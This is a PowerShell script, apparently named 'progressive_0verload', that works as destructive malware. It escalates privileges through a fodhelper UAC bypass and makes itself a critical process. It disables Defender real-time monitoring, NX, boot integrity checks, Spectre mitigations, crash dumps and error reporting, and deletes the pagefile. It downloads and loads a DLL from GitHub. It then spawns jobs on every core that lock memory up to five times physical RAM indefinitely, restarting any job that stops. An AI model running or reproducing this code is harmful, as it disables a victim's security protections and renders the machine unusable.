if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    $scriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
    
    New-Item -Path $registryPath -Force | Out-Null
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force | Out-Null
    
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item -Path $registryPath -Recurse -Force
    exit
}

# --- Critical Memory Tweaks ---
# Enable lock memory privilege for large pages
$signature = @"
using System;
using System.Runtime.InteropServices;

public class MemLock {
    [DllImport("kernel32.dll")]
    public static extern bool VirtualLock(IntPtr lpAddress, UIntPtr dwSize);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, ulong dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPriv, ref TokPriv1Luid NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("ntdll.dll")]
    public static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

    [DllImport("kernel32.dll")]
    public static extern bool SetProcessWorkingSetSizeEx(IntPtr hProcess, IntPtr dwMinimumWorkingSetSize, IntPtr dwMaximumWorkingSetSize, uint Flags);

    [DllImport("ntdll.dll")]
    public static extern int NtSetSystemInformation(int InfoClass, IntPtr Info, int Length);

    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);

    [DllImport("kernel32.dll")]
    public static extern uint GetLargePageMinimum();

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public ulong LowPart;
        public long HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TokPriv1Luid {
        public int Count;
        public LUID Luid;
        public int Attributes;
    }

    public const int SystemMemoryQuotaInformation = 0x25;
    public const int QUOTA_LIMITS_HARDWS_MIN_ENABLE = 0x00000001;
    public const int QUOTA_LIMITS_HARDWS_MAX_DISABLE = 0x00000008;
    public const int SE_PRIVILEGE_ENABLED = 0x00000002;
    public const uint TOKEN_QUERY = 0x00000008;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
    public const string SE_LOCK_MEMORY_NAME = "SeLockMemoryPrivilege";
}
"@
Add-Type -TypeDefinition $signature

# Become critical process
[MemLock]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null

# Enable SeLockMemoryPrivilege
$tokenHandle = [IntPtr]::Zero
[MemLock]::OpenProcessToken((Get-Process -Id $PID).Handle, [MemLock]::TOKEN_ADJUST_PRIVILEGES -bor [MemLock]::TOKEN_QUERY, [ref]$tokenHandle) | Out-Null

$luid = New-Object MemLock+LUID
[MemLock]::LookupPrivilegeValue($null, [MemLock]::SE_LOCK_MEMORY_NAME, [ref]$luid) | Out-Null

$tp = New-Object MemLock+TokPriv1Luid
$tp.Count = 1
$tp.Luid = $luid
$tp.Attributes = [MemLock]::SE_PRIVILEGE_ENABLED

[MemLock]::AdjustTokenPrivileges($tokenHandle, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null

# --- Pagefile Removal with Force ---
# Disable paging entirely
$enabled = $false
[MemLock]::RtlAdjustPrivilege(19, $true, $false, [ref]$enabled) | Out-Null  # SeLockMemoryPrivilege
if (-not $enabled) { [MemLock]::RtlAdjustPrivilege(19, $true, $false, [ref]$enabled) | Out-Null }
$hProcess = (Get-Process -Id $PID).Handle
$maxMemory = [convert]::ToInt64(((Get-CimInstance Win32_PhysicalMemory).Capacity | Measure-Object -Sum | Select-Object -ExpandProperty Sum))
[MemLock]::SetProcessWorkingSetSizeEx($hProcess, [System.IntPtr]::new($maxMemory - 1GB), [IntPtr]::new($maxMemory), [MemLock]::QUOTA_LIMITS_HARDWS_MIN_ENABLE -bor [MemLock]::QUOTA_LIMITS_HARDWS_MAX_DISABLE) | Out-Null
Start-Process wmic -ArgumentList 'computersystem set AutomaticManagedPagefile=False' -NoNewWindow -Wait
Start-Process wmic -ArgumentList 'pagefileset where (name="C:\\\\pagefile.sys") delete' -NoNewWindow -Wait
Invoke-Expression "bcdedit /set useplatformclock true"
Invoke-Expression "bcdedit /set disabledynamictick yes"
Invoke-Expression "bcdedit /set nointegritychecks yes"
Invoke-Expression "powercfg /hibernate off"
Invoke-Expression "bcdedit /set nx AlwaysOff"
# Invoke-Expression "bcdedit /set testsigning on"
# Disable crash dumps
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -Value 0 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "LargeSystemCache" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "PagingFiles" -Value "" -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "HeapDeCommitFreeBlockThreshold" -Value 0x00040000 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\PriorityControl" -Name "Win32PrioritySeparation" -Value 26 -Force
# Disable memory protections
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "FeatureSettingsOverride" -Value 3 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "FeatureSettingsOverrideMask" -Value 3 -Force
#Lock Pages
if(-not(Test-Path -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")) { 
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Force 
}
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLockPages" -Value 1 -Force
# Power settings
# Get all available power plans
$powerPlans = powercfg /list
$highPerformancePlan = $powerPlans | Select-String -Pattern "High Performance"
$guid = ($highPerformancePlan -split '\s+')[3]
if ($guid) {
    powercfg /setactive $guid
    Write-Host "High Performance plan activated."
}
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\bc5038f7-23e0-4960-96da-33abaf5935ec" -Name "Attributes" -Value 0 -Force  # Disable power throttling

# Disable memory compression
Disable-MMAgent -MemoryCompression
# Disable prefetch
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -Force
# Disable antivirus interface
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
# Kill Windows Error Reporting
Stop-Service "WerSvc" -Force
Set-Service "WerSvc" -StartupType Disabled
Remove-Item -Path "C:\pagefile.sys" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\swapfile.sys" -Force -ErrorAction SilentlyContinue

$moduleDir = "$env:windir\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.ThreadJob\2.2.0"

if(-not(Test-Path -Path $moduleDir -PathType Container)){
    New-Item -Path $moduleDir -ItemType Directory -Force | Out-Null
}

iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/Microsoft.PowerShell.ThreadJob.psd1" -OutFile "$moduleDir\Microsoft.PowerShell.ThreadJob.psd1"
iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/Microsoft.PowerShell.ThreadJob.dll" -OutFile "$moduleDir\ThreadJob.dll"

Import-Module Microsoft.PowerShell.ThreadJob -Force

# --- Memory Allocation Parameters ---
$physicalMem = (Get-CimInstance Win32_PhysicalMemory).Capacity | Measure-Object -Sum | Select-Object -ExpandProperty Sum
$targetMem = [math]::Floor($physicalMem * 5)  # 500% of RAM
$chunkSize = 8MB
$jobs = [System.Collections.ArrayList]::new()

# --- Kernel-Level Memory Allocation Function ---
$memHogScript = {
    param($chunkSize, $targetMem, $signature)

    Add-Type -TypeDefinition $signature
    $memBlocks = [System.Collections.Generic.List[IntPtr]]::new()
    $chunkBlocks = [System.Collections.Generic.List[byte[]]]::new()
    $allocated = 0
    $MEM_COMMIT = 0x00001000
    $MEM_RESERVE = 0x00002000
    $MEM_LARGE_PAGES = 0x20000000
    $PAGE_READWRITE = 0x04
    $part = 4MB

    while ($allocated -lt $targetMem) {
        $ptr = [MemLock]::VirtualAlloc([IntPtr]::Zero, $chunkSize, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)  # MEM_COMMIT | MEM_RESERVE | MEM_LARGE_PAGES
        if ($ptr -eq [IntPtr]::Zero) {
            echo "ACCESSED TO FIRST IF for chunksize : $chunkSize" >> "C:\FAILED.txt"
            $chunkSize = [math]::Min($chunkSize / 2, 4KB) # last was (256MB)
            continue
        }
        
        try{
            
            if(-not([MemLock]::VirtualLock($ptr, [UIntPtr][uint64]$chunkSize))){
                for ($i = 0; $i -lt $chunkSize; $i+= $part) {
                    $chunkPtr = [IntPtr]::Add($ptr, $i)
                    $lockRes = [MemLock]::VirtualLock($chunkPtr, [UIntPtr][uint64]$part)
                    $tempPart = $part
                    while(-not ($lockRes) -and ($tempPart -gt 1)) {
                        $tempPart = [math]::Max($tempPart/2, 1)
                        $lockRes = [MemLock]::VirtualLock($chunkPtr, [UIntPtr][uint64]$tempPart)
                    }
                    if(-not ($lockRes)){
                        echo "VirtualLock failed for : $ptr + $i" >> "C:\FAILED.txt"
                       # Write-Output "VirtualLock failed for : $ptr + $i = $chunkPtr"
                    }
                }
            }
            # Touch memory to force physical allocation
            # [System.Runtime.InteropServices.Marshal]::WriteInt64($ptr, [DateTime]::Now.Ticks)
            $pageSize = 4096
            $buffer4K = New-Object byte[] $pageSize
            $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
            for ($i = 0; $i -lt $chunkSize; $i += $pageSize) {
                $chunkPtr = [IntPtr]::Add($ptr, $i)
                # Write 4KB buffer to each page
                $rng.GetBytes($buffer4K)
                [System.Runtime.InteropServices.Marshal]::Copy($buffer4K, 0, $chunkPtr, $pageSize)
            }
            $chunk = New-Object byte[] $chunkSize
            $rng.GetBytes($chunk)
            $memBlocks.Add($ptr)
            $chunkBlocks.Add($chunk)
            $allocated += $chunkSize
            # $chunkSize += $part
        }
        catch{
            if ($_ -is [System.OutOfMemoryException]) {
                echo "Out of memory at $chunkSize bytes. Continuing with smaller chunk size." >> "C:\FAILED.txt"
                Write-Warning "Out of memory at $chunkSize bytes. Continuing with smaller chunk size."
                $chunkSize = [math]::Min($chunkSize / 2, 4KB)  # Reduce chunk size to avoid hitting memory limits (last was 256MB)
                continue
            }
            else {
                Write-Warning "Memory allocation failed at $chunkSize bytes: $_"
            }
            echo "EXCEPTION : $_" >> "C:\FAILED.txt"
        }
    }    

    # Hold memory indefinitely
    while ($true) { 
        foreach ($block in $memBlocks) {
            [System.Runtime.InteropServices.Marshal]::ReadInt64($block) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteInt64($block, [DateTime]::Now.Ticks)
        }
        # [GC]::Collect()
        # [GC]::WaitForPendingFinalizers()
        # Start-Sleep -Seconds 5 
    }
}

# --- Launch Memory Hogs ---
function Start-StressJob {
    param($index)
    $job = Start-Job -ScriptBlock $memHogScript -ArgumentList $chunkSize, $targetMem, $signature
    $job | Add-Member -NotePropertyName Retries -NotePropertyValue 0
    $jobs.Add($job)
}

# Start stress jobs for each CPU core
1..(([Environment]::ProcessorCount)) | ForEach-Object {
    Start-StressJob -index $i
}

$jobs | ForEach-Object {
    Write-Host "Job $($_.Id) state: $($_.State)"
}

# --- Monitoring with Minimal CPU Impact ---
while ($true) {
    $currentJobs = @($jobs.ToArray())
    $currentJobs | Where-Object { $_.State -ne 'Running' } | ForEach-Object {
        $newJob = Start-ThreadJob -ScriptBlock $memHogScript -ArgumentList $chunkSize, $targetMem, $signature
        $newJob | Add-Member -NotePropertyName Retries -NotePropertyValue ($_.Retries + 1)
        $jobs.Remove($_)
        $jobs.Add($newJob)
    }
    Start-Sleep -Seconds 10  # Reduced monitoring frequency
}
